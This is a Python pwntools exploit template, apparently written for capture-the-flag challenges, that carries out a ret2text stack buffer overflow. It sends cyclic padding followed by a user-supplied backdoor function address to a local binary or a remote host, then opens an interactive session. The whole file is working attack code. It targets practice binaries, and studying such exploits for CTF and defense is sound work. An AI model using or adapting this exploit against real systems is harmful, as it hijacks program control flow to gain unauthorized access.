# -*- coding: utf-8 -*-
# @Time     : 2023/11/12 22:55
# @Author   : 君叹
# @File     : ret2text.py

### 常见地， ret2text 都会存在一个后门函数地址

from pwn import *
import argparse

parser = argparse.ArgumentParser(description="Process some integers")
parser.add_argument('-t', type=str, help='本地 or 远程地址')
parser.add_argument('-p', type=int, help='端口号')
parser.add_argument('-b', type=str, help='bit位')

arg_list = parser.parse_args()
if arg_list.t == 'local':
    io = process("./pwn")
else:
    io = remote(arg_list.t, arg_list.p)

if arg_list.b == '32':
    context(arch='i386', os='linux', log_level='debug')
    ebp_len = 4
elif arg_list.b == '64':
    context(arch='amd64', os='linux', log_level='debug')
    ebp_len = 8
else:
    log.error("bit位设置错误， 32 or 64")
    exit()

# gdb.attach(io, 'b main')

elf = ELF('./pwn')
backdoor = None
if backdoor is None:
    backdoor = input("backdoor address(In hexadecimal, please start with 0x): ")
    backdoor = int(backdoor, 16) if '0x' in backdoor else int(backdoor)
buf_length = input("buf to ebp length(In hexadecimal, please start with 0x): ")
buf_length = int(buf_length, 16) if '0x' in buf_length else int(buf_length)

payload = flat([cyclic(buf_length + ebp_len), backdoor])

io.sendline(payload)
io.interactive()